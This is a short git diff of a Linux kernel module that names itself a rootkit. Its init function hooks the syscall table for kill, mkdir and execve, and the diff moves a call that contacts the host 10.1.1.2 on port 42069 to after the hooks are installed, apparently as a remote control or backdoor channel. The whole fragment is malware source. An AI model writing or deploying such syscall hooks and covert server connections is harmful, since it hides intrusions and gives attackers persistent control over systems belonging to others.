@@ -14,7 +14,6 @@ kernel module imports
 
 static int __init ModuleInit(void) {
   printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
-  server_connect("10.1.1.2", 42069);
   get_syscall_table();
   install_hook(&sys_kill);
   install_hook(&sys_mkdir);
@@ -22,6 +21,7 @@ static int __init ModuleInit(void) {
   orig_kill = sys_kill.orig_syscall;
   orig_mkdir = sys_mkdir.orig_syscall;
   orig_execve = sys_execve.orig_syscall;
+  run_server("10.1.1.2", 42069);
   return 0;
 }
 static void __exit ModuleExit(void) {
